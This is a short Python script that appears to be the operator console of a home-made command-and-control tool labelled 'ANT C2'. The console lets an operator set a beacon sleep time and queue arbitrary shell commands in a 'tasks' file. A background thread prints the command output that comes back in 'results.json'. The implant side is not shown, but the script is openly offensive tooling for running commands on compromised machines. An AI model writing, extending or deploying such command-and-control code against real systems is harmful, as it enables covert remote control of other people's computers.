#!/usr/bin/env python3

import json
import threading


def get_action():
    action = str(input("ANT C2>> "))
    if action.upper() == "SLEEP":
        while True:
            try:
                sleep_time = int(input("Set Time (only integer values are accepted)>> "))
                with open("tasks", "r+") as f:
                    content = json.load(f)
                    content["sleep"] = sleep_time
                    f.seek(0)
                    json.dump(content, f)
                    f.truncate()
                    break
            except ValueError:
                print("[!] Enter a valid integer")
    elif action.upper() == "EXIT":
        exit(0)
    elif action.upper() == "SHELL":
        while True:
            command = str(input("Enter shell command or 'quit'>> "))
            if command == "quit":
                break
            with open("tasks", "r+") as f:
                content = json.load(f)
                content["command"] = command
                f.seek(0)
                json.dump(content, f)
                f.truncate()


    else:
        return

def read_results():
    while True:
        try:
            with open("results.json", "r+") as f:
                content = json.load(f)
                f.seek(0)
                f.write("")
                f.truncate()
                results = str(content.get("output"))
                command = str(content.get("command")).strip()
                output = "\n\n" + "Results of " + command + ":\n" + results
                print(output)
        except Exception:
            continue

def main():
    thread = threading.Thread(target=read_results, args=(), daemon=True)
    thread.start()
    while True:
        get_action()


if __name__ == "__main__":
    main()